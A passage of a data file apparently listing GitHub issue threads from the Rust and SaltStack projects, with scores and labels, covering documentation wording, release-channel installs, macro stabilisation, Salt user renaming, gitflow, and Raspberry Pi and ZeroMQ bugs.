of JavaScript pouting in every day) and if we manage to capture their interest the Rust ecosystem will greatly benefit. Just look at Go, released less than 5 years ago and where it is today, thanks to the people coming over from Python/Ruby. I am not saying the Guide should be accessible to everybody, however it should be accessible to people without previous C++ experience and I think @friend  does a great job at achieving this goal. As far as the car analogy, well sure - not every analogy's so great, but that goes for a lot of books, TV shows etc. as well and I think as long as a point is made clearly, the particular analogy doesn't really matter that much.  I find analogies are ultimately distracting and unhelpful. Rather than saying what cargo is like, it's better to say what it actually is. It's probably better to first explain what cargo is, before explaining that it's in alpha state.  Analogies are good only when they explain a difficult relation in terms of ordinary experiences. In this particular case the relation rustc-cargo isn't very difficult to grasp and the robotic drivers image isn't ordinary or helpful - rather, it's a convolution.  I think part of the problem is that which every tutorial has its adressing very different people at the same time. Perhaps there should be two tutorials Rust for ""beginners"" (anyone not too familiar with compiled languages), and Rust for those with more ""experience"". I think the chatty, friendly language is great for beginners, but could easily be ""distracting and unhelpful"" for those already familiar with the basic concepts, if not with how Rust handles them. Just an idea...  @friend Yeah, I think that's a great idea and we already kind of have that with the Guide being chatty and the Tutorial being not so chatty.  So, perhaps instead of the Guide replacing the Tutorial, it could supplement the Tutorial, although that would require two pieces of documentation with a similar aim being maintained.  @friend Yes, it has its drawbacks it would require two pieces of documentation with similar aims; I'm not sure how that is best addressed. I wonder what our Documentation Master @friend thinks... It is a tricky thing, though beginners need to be taught with an understanding that these concepts are complicated, take time to learn, and are not simple; I think the current tutorial does that very well. More experienced people see things like type systems and pointers as obvious and simple and feel talked-down-to when those concepts are given too much time and treated too simply for their tastes. Perhaps its more like a 2-part tutorial, where the ""beginner"" section leads into the ""experienced"" section, and at the beginning, there is a suggestion that those with more experience may want to jump to Part 2? That still has its drawbacks, as you have to balance between covering everything in the right place for each group and trying not to repeat yourself, but maybe...  @friend Perhaps it doesn't have to be 2 part, but having a piece of JavaScript where one could click on a ""Background"" tab next to problematic sections (e.g. pointers) and have a little bit of a background info on pointers unfold, whereas the experienced programmers would just leave the ""Background"" tabs collapsed and flow with it as an advanced tutorial.  This way you can have one Tutorial accessible to both camps, altrough I would too like to hear @friend's opinion on this.  Here is my opinion and general plan  I think that enough people not liking this is justification to remove it. Can anyone suggest something that should go in its place, or should we just axe the paragraph and be done with it?  @friend Based on the comments and the fact that the next paragraph explains what Cargo really is in the first sentence; ""Cargo manages three things building your code, downloading the dependencies your code needs, and building the dependencies your code needs."", I would just axe the analogy paragraph and be done with it. Awesome Guide BTW. ",28,2,250,0,0,152,7,n,
rust/rust-lang/19263,0.129913454,rust-lang,rust,Support installing multiple release channels,6721,66,46,0,6,"Rust is going to have three release channels stable, beta, and nightly. Each of them has its use (that‚Äôs why they exist), so it will probably be common to have more than one of them installed at the same time on the same machine (such as a developer‚Äôs laptop). Currently, this it is possible to install multiple rusts at different locations, and set up the  and (since the [rpath removal])  environment variables to pick one of them. However this is error-prone and not very convenient. It would be better if multiple versions could be installed in the same ""prefix"" (e.g. , where the default environment variables Just Work&lt;sup&gt;¬Æ&lt;/sup&gt;). Executables could have a suffix to distinguish them, for example  (stable),  and . Other files would have to be namespaced somehow to avoid conflicts. (Corresponding Cargo issue  Semi-related I have been wondering whether we should start distributing a wrapper script for invoking  that sets up the  and other environment variables appropriately. I saw a user recently who untarred the  binary package and tried to copy  into a different location.  I advised them to ""just install it globally"", but I would prefer to have some support for the use case where you do not install the distribution into .  I have been maintaining my own private script for supporting this, but it would probably be good to determine what our general attitude is about this.  (That is, if the team thinks we can stomach supporting a wrapper script, then I can work on making my own script more robust and making it distributable.  If the team hates the idea of a wrapper script ... well, then that's unfortunate given that we've also discarded using rpaths...)  Update Oh, the reason that this is related to this topic is that a wrapper script can be written to support multiple release channels, either by having multiple scripts that point to the different spots as necessary, or by having a single script that reflectively dispatches on , i.e. guessing based on whether we see  or  in the script's name.  There is endless precedence for this kind of tooling in the Ruby/Python worlds, and it's quite useful.  @friend, right. At some point we might also want to do this by version numbers (e.g. have Rust 1.3 next to 1.4) in addition to release channels.  The obvious problem with putting a bunch of same-named libraries next to each other is that they are going to cause resolution conflicts. We might resolve that by attaching a unique id to each build of the compiler and associating every library with that build. That will have some impact on distributing binary libs (which presumably nobody does currently). The docs are also going to cause naming conflicts as well as some of the other supplementary files. Have to consider all the different ways of installing Rust and whether and how to make them all compatible with multi-rust.  Note that our makefiles specify a 'extra filename' paramter to be mixed into all filenames  could tweak that per-release channel in theory. The binaries themselves won't have it mixed in, though (just the libs).  I agree with @friend .  It should suffice to extract as many TAR archives as the user wish under the common ""base"" directory in a parallel manner.  They can coexist and uninstalling one of them is as simple as . *nix We can simply provide a wrapper shell script to choose one of multiple installations We can enhance this wrapper following battle-tested tools such as  (Ruby),  (Python), or  (Node.js)  (Several similar tools exist for each language;  I'm not claiming they are the best ones for their languages.) To those who likes nitpicking not setting  properly is caller's fault. Windows The idea is the same as the *nix case.  Instead of , we can implement a wrapper executable which calls  to locate the base directory   @friend another option for Windows is a wrapper  script.  You can use the variable  which expands () into the drive () and path () for the batch file ().  See also  do not do much Windows hacking; I just remembered that we used a trick like this in the Larceny project larceny.bat, and I think a batch file will be easier for end-users to modify/maintain than a wrapper executable.)  It‚Äôs maybe not as essential that all of the ways to install support this, as long as some of them do. In particular, the packages for Rust release and nightly in my distribution currently conflict, and I‚Äôd like them not to ) IMO it‚Äôs ok if packagers need to do a small amount of work (like passing the right  flags) to make this happen.  I have a project that supports installation of multiple Rusts  It depends a bit on the upcoming release channel and installer infrastructure.  Hello, I am a co-maintainer of rust on Gentoo. Are there any updates on this issue? What is the appropriate way to install multiple release channels? Thanks much, William  I believe the compiler itself can add support for things (though I‚Äôm not sure what exactly) to make this easier. In the meantime Brian has been working on  , which I believe is the best we can do right now. You probably don‚Äôt want to import it as-is into the Gentoo packaging system, but you could take ideas. Specifically, it ""installs"" different Rust versions in different directories. (It just extracts tarballs with pre-built binaries, but I believe it‚Äôs equivalent to building with .) Then, wrapper scripts run executables from one install or another after setting up the environment, most importantly the  variable.  Triage multirust has matured significantly.  Here's one unfortunate case where multirust doesn't help, and other than bringing back rtool I'm not sure what will. It seems like it should be a non-negotiable requirement that one can run a program after building it without having to invoke any black magic between build and run.  @friend Just to mention it, Gentoo deals with multiple rust installations already and names them e.g.  and manages a symlink using . So there is the overlay called rust (obviously) which contains the special versions rust-9999 (git) and rust-999 (nightly). Would it be possible to have rust (binary named *-stable), rust-beta and rust-nightly in this repo? Then I could manage my versions (which are updated as expected by the package manager) using eselect for the default compiler and still use rustc-beta and rustc-nightly or rustc-9999 for the other versions. This way I could test libraries much more easily for stable/beta/nightly compatibility. Edit Sorry, I did not see before that the portage (non-overlay) is also ruststable and the rust-999 of the overlay is rustnightly. Still, the beta is missing.  I believe multirust is basically our answer here, so closing, yay!  Now if only we had a Windows equivalent! ",32,1,236,0,0,107,5,n,
rust/rust-lang/21568,0.047593815,rust-lang,rust,"Book uses academic term ""arity"" without definition",4304,60,29,0,0,"In the Compound Data Types chapter of the book, the term ""arity"" is used without any prior definition I've learned enough formal logic and programming language theory to know what ""arity"" means, but I suspect most programmers don't. (Neither does my spell checker!) And the book otherwise seems to be trying to use clear language and be readable by non-experts. I suggest changing it to  Sounds great to me, feel free to submit a pull request )  Maybe with ""types"" instead of ""type"".  Or  I'd prefer just defining . it's a really useful word.  It's a useful word if you do a lot of functional programming or formal logic ;-), but the rest of the book is very informal and tries hard to make J. Random Scripter feel comfortable, so tossing in a $20 word seems out of place. Maybe  But the arity refers to just the number of entries, not their types. It's an incomplete description and so awkward to define in passing.  I don't think arity need be mentionned. Saying ""contain the same types"" seems sufficient. That already has to deal with (A, B) vs (B, A). Seems to me that also deals with (A, A) vs (A, A, A).  I had seen  in the docs to, and it simply pissed me off.  Why force me to use google and dictionary.com?  Please just explain things in plain english, the docs is not a place to show off how smart you are and how advanced your english is.  @friend it's not to show off fancy language, it's a computer science term. It's a good word for any programmer to know.  @friend sometimes plain english is simply better, these are docs are supposed to make it easy to learn rust.  The reader is not likely interested in a course on rarely used computer science terms.  Just have a look part of the definition of  on wikpedia.  Cartesian product? dyadic? valency? adicity and degree? This term  comes off as very elitist.  Save it for your own blog, not the docs. ""In logic, mathematics, and computer science, the arity Listeni/Àà√¶r…®ti/ of a function or operation is the number of arguments or operands the function or operation accepts. The arity of a relation (or predicate) is the dimension of the domain in the corresponding Cartesian product. (A function of arity n thus has arity nplus one considered as a relation.) The term springs from words like unary, binary, ternary, etc. Unary functions or predicates may be also called ""monadic""; similarly, binary functions may be called ""dyadic"". In mathematics arity may also be named rank,[1][2] but this word can have many other meanings in mathematics. In logic and philosophy, arity is also called adicity and degree.[3][4] In linguistics, arity is usually named valency.[5]""  plus one for keeping  somehow. It's well worth learning the word imho.  @friend This attitude is not going to serve you well in Rust.  It's not ""elitist"" to define precise terms for concepts that may be hard to express in ""plain english"". Of course one should define them in the text.  And in this case I don't think it's worth the trouble, because there are satisfactory explanations in ""plain english"" (see above).  So, I'm in agreement with you that the text needs to be changed.  But turning it into a rant about ""elites"" is just gross and unhelpful. The thing is... when people ignore your ideas while making fun of the words you use to express them, it really does breed a bitterness and elitism, and ultimately a sort of siege mentality that you'll see in a lot of functional programming communities.  It's not pretty, and I don't want Rust to go the same way, although I don't think it's particularly likely. So please let's leave the culture war out of it.  Technical writing is hard. There are always many tradeoffs.  Just because someone uses a word you don't know, doesn't mean they're maliciously trying to feel superior to you.  My unsolicited advice Embrace being around people who know things you don't. Then you can learn from them. I hope that the Rust community will always be a safe place for that.  Slight modification. I think signature is the right word. Even if signatures' definition is unclear, the example should make it's meaning understandable; something the arity lacked.  You can assign tuples onto each other if the signature matches  @friend The PR that addresses this ticket has been merged. Should this issue be closed now?  Yes, thanks. ",13,4,189,0,0,85,7,y,
rust/rust-lang/27970,0.065681922,rust-lang,rust,Does getaddrinfo need to take the ENV lock?,1240,10,7,0,0,"Like the documentation for our  (setenv) says, care must be taken with mutating environment variables in a multithreaded program. See this glibc bug #13271 that says getaddrinfo may call getenv. It looks like we have an unsynchronized call to getaddrinfo and this may cause trouble with glibc/Linux. Seeing glibc's attitude to setenv in multithreaded programs,  seems like a big hazard in general(?). Discovered as an issue tangential to #27966 cc @friend  If we did take this route I'd want to convert the environment lock to a rwlock to ensure that we could at least have parallel dns queries. Also cc #27705.  Yeah, either way the situation is tricky. We get tangled up in glibc internals.  I found the wording on this page also particularly interesting The getaddrinfo function is indeed marked with this tag  is just broken, as I commented on issue #24741 Even without low-level races,  is not quite safe because you can change a variable (such as ), do something, and change it back to the original value, without impacting something else in the process which runs at the same time. This problem would not go away if we provided thread-safe environment access at the libc layer. Therefore, I'm surprised the function isn't marked **. ",7,0,41,0,0,18,1,n,
rust/rust-lang/41022,0.069806562,rust-lang,rust,Tracking issue for `:vis` macro matcher,5604,60,33,0,1,"Tracks stabilization for accepting  as a fragment specifier in macros, gated by . Introduced in #41012.  I tried in #40984 to parse a pattern like  but the visibility isn't enough to terminate the repetition. It's unclear if this is a systemic issue with  or if it can be worked around.  Is this mature enough to be stabilized?  45388 will be a minor breaking change to  consider .  Shall we stabilize this?  This feature was implemented and tested in  AFAICT there have been no issues or problems since then. @friend fcp merge  Team member @friend has proposed to merge this. The next step is review by the rest of the tagged teams  [ ] @friend [x] @friend [ ] @friend [ ] @friend [ ] @friend [ ] @friend [ ] @friend  No concerns currently listed. Once these reviewers reach consensus, this will enter its final comment period. If you spot a major issue that hasn't been raised at any point in this process, please speak up! See this document for info about what commands tagged team members can give me.  I would like to see a comment pointing out the relevant tests so I can review the behavior. =)  @friend concern if we make further changes to the visibility modifiers as we continue to evolve the module system, will this cause back compat issues here?  I would assume that  will continue to match whatever visibility specifiers are added. Such further changes should be carefully designed to avoid introducing ambiguities. On Wed, Jan 17, 2018 at 939 PM, Nick Cameron notifications@friend.com wrote  I agree with @friend. This is definitely ""a thing"", but I think that to a large extend these ambiguities exist already. For example, introducing the  modifier and the possibility of paths like  introduced an ambiguity that affects the  visibility specifier -- but also tuple structs (same with  style visibility modifiers).  @friend thanks for the examples.  @friend Was your concern adequately addressed, or do you have more questions?  @friend it kind of does. However, we seem to be very close to settling on a final design for modules/visibility reform and it seems to me that waiting another month or so for that before stabilising would be beneficial. Consider the concern resolved if others don't think that meaningfully reduces risk.  @friend hmm -- actually -- now that you mention it =) So the main change there (which is not afaik controversial) is that we are going to add  as a keyword. One would expect the behavior of  to change when  is added, which may of course break macros. This is of course nothing new. ( also adds a measure of ambiguity -- at least in some proposals -- in that paths could plausibly begin with .) I continue to regret that we have format specifiers at all. All that said, I'm still sort of inclined to go forward with . We routinely break macros by extending Rust's grammars, sadly enough. But it'd be nice to know what the approved follow-set of  is, I forget. As long as it's suitably narrow, this shouldn't be a big problem.  The follow set is currently   all identifiers and keywords except  tokens that  meta-var which is ,  or   We may need to change rule 2 to exclude . But why  is outside of the follow-set while  is in it? Or is it just an oversight? ü§î  I can't say I appreciate the fatalistic attitude of ""well, we're going to break macros and assume there's no opposition"". But in that case, perhaps we should hold off stabilizing vis until  is a keyword? On Wed, Mar 7, 2018 at 203 PM, kennytm notifications@friend.com wrote  @friend  is already a keyword...  Yes, I (and @friend I guess) meant it is going to be accepted as a keyword in a new context.  @friend Sorry if I came off too blas√©. I'm mostly just embittered with the situation, which I find quite frustrating -- we foresaw the problem, but our solution just didn't work. It annoys me, in part because the simpler solution that we originally had in mind would have worked fine. =) But clearly we are not going to allow this to stop us from modifying our grammar. I hope we can address in Macros 2.0 by changing how fragments work. As far as I know roughly the only scheme that works is to have  consume all token trees until something from the designated ""follow set"" of  is found, and then try to parse those tokens as a , and error if extra tokens are left over. But that's a topic for another thread I suppose. I think it's reasonable.  @friend Now that we've come closer to finalizing the modules system under the 2018 edition, do you feel more comfortable resolving your concern here?  @friend resolved if we make further changes to the visibility modifiers as we continue to evolve the module system, will this cause back compat issues here? (Assuming that  will match  like )  bell This is now entering its final comment period, as per the review above. bell  The final comment period, with a disposition to merge, as per the review above, is now complete.  This is in need of a stabilization PR! There's a stabilization guide on the forge. Please post here if you plan to take this issue! (I'll circulate it around and see if anyone wants to take it as a good first or third PR)  @friend as discussed, I would like to try my hand at doing the stabilisation PR. Will ping if I get stuck  This has been stabilized and the reference has been amended, so this seems done.  I'm popping in here while trying to more fully document the follow-set rules in the reference, and the  discussion above doesn't quite make sense to me. Was the intent to exclude  from the follow-set of ? Because it is currently in it---both because  has  and because  is an identifier other than non-raw . ",26,35,209,0,0,97,13,n,
salt/saltstack/15511,0.100887335,saltstack,salt,Add a function to rename user,3971,49,27,0,1,"Please provide a function to rename OS users. In GNU/Linux this can be done by using . See  I think that OS X uses similar attitude. It should be possible to rename user in Windows either (I've done it using Control Panel). After adding this function,  state should not fail if user provides  that is already used by the user with different name, but rename the user.  Seems very reasonable, thanks for the request.  Looking into this.  Looks pretty straightforward, only question will be Windows.  Might need to consult with @friend  Only implemented functions to rename user.  Need to think about the changes to the state function.  Right now it attempts to run the respective add and if it fails reports back that the user add failed.  We could at that point attempt to rename the user but would need to know that it failed because of something like UID already existing.  I'm actually not convinced that we should change the state.  I feel like we're assuming too much at that point -- if we accidentally put in a UID that already exists, it's going to rename the user?  That seems like asking for trouble.  If we want to add renaming to the state, we should hide it under a new argument.  I was thinking about including an additional argument to the present function, rename or rename_on_fail or something, but you're right it opens up a whole can of worms for potential error cases.  Maybe just adding a new state function to rename users and make the error reporting on a failure in the present function better about reporting that the UID already exists for another user.  I just feel like renaming users is one of those things that's just not designed to be idempotent.  I feel like if you need to do a user rename, you use remote execution () out of band of your states.  But maybe there's a case for allowing it within states.  Not totally sold on the idea either.  The rename function is now in develop, we could let it sit and see if that meets the need, then revisit the second part of this request if the use case arises.  Agreed.  I am going to close this as resolved for now, pending further discussion.  Wait, wait! Use case I've prepared an image of openSUSE distribution for programmers of the company I'm working at. I've included default user named 'programmer'. But I want real username and hostname, based on this username. After the first load AutoYaST + my scripts ask username save it into grains ( requires user), makes appropriate hostname and , and starts salt. Salt renames user and manages files. I think shipping image without users at all and creating first user using salt would be inflexible, because I couldn't even load X11 if salt don't create user (due the lack of connection, for example).  Do you have to rename the user?  Couldn't you simply create the new user for the person who will be using the machine?  Just after the answering to AutoYaST questions openSUSE loads with the  user. That means that the home directory is populated with files. I don't need this directory. Well, I can delete the user (and the home directory) via additional state, but I cannot do it while this user is running KDE. Also my state assumes that home folder of the real user is already in a correct state, but that's not true until I login to the KDE for the first time. Also KDE don't want to load if it finds some files under the  directory. That means that I need to reboot the machine manually anyway before my highstate. And one more thing some distributions (including openSUSE) disable auto login when there are multiple users in the system. I don't want that. You see, it's not so simple, as it appears on the first blush.  So at that point I would lean towards using  with an  I still don't think it's something that necessarily belongs in the  state.  (I will also note I haven't actually looked at @friend's new rename code, so I'm sure the above example uses the wrong argument names)  Pretty close )  old = name and new = new_name. ",18,0,121,0,0,114,4,n,
salt/saltstack/236,0.105497141,saltstack,salt,start using gitflow,1820,15,38,0,2,"Hi Thomas, I want to make progress... gitflow [0] is next thing to attack. Here's how to do it... it's trivial as you can see (of course, you don't clone but use the orig repo) sa@friend/tmp$ git clone  into salt... remote Counting objects 7943, done. remote Compressing objects 100% (2398/2398), done. remote Total 7943 (delta 5480), reused 7907 (delta 5450) Receiving objects 100% (7943/7943), 1.22 MiB | 756 KiB/s, done. Resolving deltas 100% (5480/5480), done. sa@friend/tmp$ cd salt/; git branch -a * master   remotes/origin/HEAD -&gt; origin/master   remotes/origin/highstate   remotes/origin/master (master u=) sa@friend/tmp/salt$ git flow init -d Using default branch names.  Which branch should be used for bringing forth production releases?    - master Branch name for production releases [master]  Branch name for ""next release"" development [develop]   How to name your supporting branch prefixes? Feature branches? [feature/]  Release branches? [release/]  Hotfix branches? [hotfix/]  Support branches? [support/]  Version tag prefix? []  (develop) sa@friend/tmp/salt$ git branch -a * develop   master   remotes/origin/HEAD -&gt; origin/master   remotes/origin/highstate   remotes/origin/master (develop) sa@friend/tmp/salt$ git push -u origin develop  Finally go to github's admin interface for salt and make develop the default branch. We're done... best of both worlds, stable master from now on, no more direct pushes to master plus we can keep the attitude of fast progress/experimenting because wild coding monkeys can start feature branches and fire away ) [0] on Debian  or from source  markusgattol, I am all for this, and it is the next thing I will set up. Sorry I have been slow on the uptake, been a busy couple of days!  branch was created on the 17th and set as default in GitHub -- closing. ",5,0,150,0,0,40,8,n,
salt/saltstack/24955,0.09148816,saltstack,salt,Minion fails to start after bootstrap on Raspberry PI,7527,83,75,0,6,"After bootstrap trying to start Version I also tried with an empty minion config, but the problem remains. I am assuming(ohoh) that it should work out of the box after bootstrapping. Am I doing something wrong ? Or doesn't this version work on a PI ?  @friend, is there another minion process running when you try to start a new process?  @friend , no there is not. Just to be sure, i double checked.  @friend, this looks like a really strange issue.  Salt itself is as portable as python, so as long as its dependencies are installed, it should work.  The best I can think of is that there may be a dependency problem that is causing the minion process to erroneously loop as you've demonstrated.  Is there any more interesting output with ?  Also, will you post the output from ?  Thanks.  @friend, would you mind posting the output from  and ?  Thanks.  (Also, this was output 3x during bootstrapping)  There may be some dependency, upstream issues here.  Salt is pure python and I'm sure nothing in python or its standard lib could cause an .  It may be that a raspberry pi (at least an older one) may be too underpowered to run a salt minion, but I am doubtful of this.  I have been able to successfully run a salt minion on hardware with lesser capacity.  I have observed the same behaviors during a reinstall on a previously-working Raspberry Pi B+. Previously I installed a Salt minion on the Pi on 2015-02-22 (I believe I also upgraded it via apt-get on 2015-04-06 although it's unclear from my notes if the new version ""took effect"" or not).  ((EDIT 2015-09-07) Regardless of whether the oldest version was still running or not, it was definitely talking to the Salt Master.) Due to filesystem corruption, on 2015-08-15 I was forced to reformat and reinstall the OS (NOOBS v1.4.1), and I noticed that running  seemed to hang no response, but no error.  Since then I've been trying various combinations of installing and reformatting, and even upgraded the Salt master, but the minion is not working properly and displays many of the behaviors commented above. For demonstration purposes, I begin with Download and install the bootstrap script Run the installer using  and it does a bunch of stuff before ending I then try (unsuccessfully) to confirm the versions of the installed software (I hit CTRL-C after about a minute of waiting) Attempt to stop the minion and restart in debug mode Eh?  It's still running? Force quit, confirm it's not running Now run the minion in a debug mode (hit CTRL-C after several minutes) Checking the contents of  shows the following Note the presence of warnings about  as was mentioned by others in this thread. During debugging, at various times I too received errors about ""Illegal operation"".  At the time I thought I had debuged that to be a matter of not running the command as sudo but I have not been able to reliably reproduce this behavior. I have also tried (and failed) to use the documented instructions to install the second-most-recent version, but it might be better to stop here and keep the focus on the current problem. Any suggestions?  We ended up switching from Raspbian to Arch.  We got it working with a Pi 2 on Raspbian, but in order to support both platforms we had to move to Arch. On Sep 8, 2015 1221 AM, ""neilr8133"" notifications@friend.com wrote  Any news on this ? )  @friend, not that I know of.  We're working on getting through our backlog of issues.  I just hit this, I had been bootstrapping pi's just fine, albeit with an older version of salt-bootstrap (2015.08.06 + mods). It seems to only be broken on the raspbian lite image for me. I've been using the offical Raspbian jessie images 2015-09-24-raspbian-jessie (works) 2015-11-21-raspbian-jessie-lite (fails) So its probably a dependency issue or a botched build of some package in the lite image. Running   gives the following output which may point to openssl, of course I might be on the wrong track....  When following the latest install instructions here  will fail to run on a raspberry pi (Illegal Instruction). But after running another apt-get upgrade which unpacks python-tornado 4.2.1-1+b2 (from stretch) over 4.2.0-1~bpo8plus one (from jessie-backports) it magically works. I think the issues are from using the standard debian repo for binary packages instead of raspbian. The python-tornado package from the standard debian archive doesn't seem to want to run on armv6 which makes sense. I'll test a fresh install without using jessie-backports and if that works i'd suggest we update the documentation for install on raspbian.  @friend For now, Salt Bootstrap doesn't support automatic installation on Raspbian. Try to follow installation instruction that @friend has suggested. I guess this issue could closed as a duplicate of saltstack/salt-bootstrap#695. Thanks!  With the Raspberry 2b, we switch to official Debian image which fully support ARMv7.  So for us, it's ok )  The Raspberry Pi 1 and 2 range are an old ARM 32 bit chip 99% of distros have dropped support for this old ARM chip.  Most (if not all) of the other single board chips run the current ARM 32bit chip   So for Raspberry Pi 1 and 2 you must get any binaries for the Raspberry Repo and not any other source.   Raspberry Pi 3 just release is current 64bit chip which will see the Raspberry Pi being able to run more distros.  I run fedora on a WandBoard which uses current 32bit chip and point the repo at the x86   and run dnf install salt* it picks up the noarch from salt the the binaries come from fedora.  I think it's a real shame that salt-bootstrap does not support raspbian and all raspberry pi's out of the box. At our salt meetup (Paris), we often have people complaining about this. Note that often people want to try out at home this technology before recommending it to their boss or at work, so in my humble opinion, theses users should get the best UX possible, and for all versions of the Pi. Seeing that a project considers Pi1 or 2 as ""old"" platforms is usually perceived as ""oh, so it's meant to run on some cutting edge hardware"". I would like to keep on encouraging hobbyists to try out salt for things such as home automation like suggested in  ... it's getting harder and harder.  @friend I think you're very welcome to submit PR to  for now, you're able to install Salt manually from Raspbian testing repo  simple script (few lines of Bash) could be written following this guide to perform bootstrapping exclusively for Raspbery PI.  I got Puppet running on ARM, logged a case for better support and got back not supported at all, and no plans to support.  SaltStack have a good attitude towards ARM Platform.  TLDR Use -P Ran into the same problem, tried the approach ""few lines of bash"" but there is also a even simpler workaround. First the bash approach (The keyserver lines are necessary at least in the current Raspbian 2016-11-25-raspbian-jessie) But as seen in  , the current default-development-branch's commit, it is already enough to specify the -P option        -P  Allow pip based installations. as then the required version will be satisfied. So this is then the currently working bash script to install salt master and minion on a Raspberry Tested on Raspbian version 2016-11-25-rasbian-jessie.  This issue has been automatically marked as stale because it has not had recent activity. It will be closed if no further activity occurs. Thank you for your contributions. If this issue is closed prematurely, please leave a comment and we will gladly reopen the issue. ",25,312,270,0,0,206,11,n,
salt/saltstack/3618,0.0976734,saltstack,salt,Assertion failed: ok (mailbox.cpp:84),8175,109,270,0,7,"When I try to make use of the reactor, I end up with an Assertion failed message. After that message, no minions can authenticate to the master and trying to stop the master process through the init script fails. I do see the master process running and need to use killall to stop it. If I then remove the reactor piece of the master config and start the master process, everything starts working again. root@friend~# /etc/init.d/salt-master start Starting salt-master daemon Assertion failed ok (mailbox.cpp84) . root@friend~# /etc/init.d/salt-master stop Stopping salt master control daemon ...start-stop-daemon warning failed to kill 10113 No such process . root@friend~# killall salt-master root@friend~# cat /etc/salt/master timeout 30 log_level warning state_verbose False  file_roots   base     - /srv/salt     - /srv/data  pillar_roots   base     - /srv/pillar  ext_pillar   - boothost_templates {}  reactor   - 'auth'     - /srv/reactor/empty.sls  root@friend~# cat /srv/reactor/empty.sls  return_true   cmd.run     - name echo 'hi'   I take it you are using git head? Do you have zombies when this happens?  Yes, I'm using head. I don't know how to tell if I have zombies or not... I'm going to guess that I do because that would explain the attitude the processes give me. When it's pissed, ps aux shows me this. It's set to have the default number of processes. root     10364  1.3  2.0 136600 21412 ?        S    1105   000 /usr/bin/python /usr/bin/salt-master -d root     10371  0.0  1.5 170972 16076 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10374  0.0  1.5 170300 15564 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10379  0.0  1.5 186692 15808 ?        S    1105   000 /usr/bin/python /usr/bin/salt-master -d When it's working fine... root     10418  0.0  1.6 235960 16444 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10419  0.0  2.0 136600 21408 ?        S    1105   000 /usr/bin/python /usr/bin/salt-master -d root     10426  0.0  1.5 170960 16068 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10427  0.0  1.5 170824 15852 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10428  0.1  2.2 222300 22768 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10435  0.1  2.2 287840 22768 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10436  0.1  2.2 287840 22764 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10437  0.1  2.2 287840 22772 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10438  0.1  2.2 287848 22768 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d  ok, this is not zombies, those are all S and Sl flags for healthy processes, it looks like the procs are failing to start!  They don't love me... ( Is there something I probably did wrong or is this a bug? If it's a bug, please let me know what I can do to help fix it.  meh, I can't reproduce this. How old is your git head?  It's from yesterday. I'll try it on the latest now.  .. same thing  What version of Zeromq are you running?  This is Debian right?  Yup. root@friend~# apt-cache policy python-zmq python-zmq   Installed 2.2.0-1   Candidate 2.2.0-1   Version table  *** 2.2.0-1 0         800  wheezy/main amd64 Packages         700  unstable/main amd64 Packages         100 /var/lib/dpkg/status   What version of libzmq are you running? is it libzmq 2.2.0 or 3.2? I think this might be us running into a know libzmq 2 bug (which would explain me having issues reproducing this)  The package name is libzmq1  So this Assertion happens because of a bug in libzmq 2, and if a zmq context it passed through to a new thread or process, I have verified that the later is not happening in the code anywhere. So I am wondering what apt-cache policy libzmq1 says, and if updating to libzmq3 will fix it  #  apt-cache policy libzmq1 libzmq1   Installed 2.2.0+dfsg-2   Candidate 2.2.0+dfsg-2   Version table  *** 2.2.0+dfsg-2 0         800  wheezy/main amd64 Packages         700  unstable/main amd64 Packages         100 /var/lib/dpkg/status  I also installed libzmq3 from experimental. I ran into the same problem. The salt-master depends on python-zmq which depends on libzmq1. So I have both libzmq1 and libzmq3 installed right now. I'm not sure how to make sure I'm using libzmq3(3.2) instead of libzmq1(2.2). I could install salt from source on the system, but I very much prefer build the package on our apt mirror and install it from there... #  apt-cache policy libzmq3 libzmq3   Installed 3.2.2+dfsg-1   Candidate 3.2.2+dfsg-1   Version table  *** 3.2.2+dfsg-1 0           1  experimental/main amd64 Packages         100 /var/lib/dpkg/status   If I change the dependency in the package to libzmq3 instead of python-zmq and install libzmq3 without either python-zmq or libzmq1 (its dependency) then I get ""ImportError No module named zmq"". I guess I don't really have any idea how to get zmq3 without zmq1. (  Sorry, I should have been more specific, libzmq3 is just the latest zeromq, it is much better and we leverage it for a lot of new features. you still need pyzmq installed, since that is the python bindings to libzmq, although you may need to recompile pyzmq after libzmq3 is installed  I think there are packages out there, lemme look   doesn't even have 3.2. I installed libzmq3 and then rebuilt pyzmq with ""easy_install -U pyzmq"" and now when I start the salt master, I get this - Starting salt-master daemon Assertion failed ok (bundled/zeromq/src/mailbox.cpp84) I'll wait until I give you a chance to do smart people research. )  yes, pyzmq 2.2.0 works against zeromq 3.2, it is kind of confusing, but we are still getting the assertion!!! Lemme keep trying to find out what is happening  man, if I could get on your system and start throwing in debug output this would be a lot easier to find.... I am still looking )  I am stumped, I can't reproduce it, I can't find any legitimate place in the code that would cause this, libzmq3 does not seem to fix it. I am still thinking and researching, but I am drying up on ideas....  If you were to chat with me on IRC I could do everything you ask as you ask me to do it. I unfortunately wouldn't be able to let you into the system.  Interesting... If I leave out the reactor part, I wind up with ""salt-master -l trace"" doing exactly what I expect. If I add the reactor part of the config and run ""salt-master -l trace"" and what I see is this,  not pressing Ctrl+C to kill it. It seems to just stop running but salt-master processes continue to run in the background.  This is the part that I find interesting from that... [TRACE   ] Added extra.config to grain [DEBUG   ] SaltEvent PULL socket URI ipc///var/run/salt/master/master_event_pull.ipc [INFO    ] Setting up the master communication server [TRACE   ] Added extra.shell to grain Assertion failed ok (mailbox.cpp84) Aborted root@friend~# [DEBUG   ] loading module in ['/var/cache/salt/master/extmods/modules', '/usr/lib/pymodules/python2.7/salt/modules'] [DEBUG   ] Skipping /var/cache/salt/master/extmods/modules, it is not a directory [DEBUG   ] Loaded groupadd as virtual group [TRACE   ] Added group.add to module  It shows the prompt but keeps truckin' along. [DEBUG   ] Loaded sysmod as virtual sys [TRACE   ] Added sys.doc to runner  root@friend~# ps aux | grep salt root     16563  0.0  2.1 136884 21620 pts/1    S    1419   000 python /usr/bin/salt-master -l trace root     16570  0.0  1.5 175036 16140 pts/1    Sl   1419   000 python 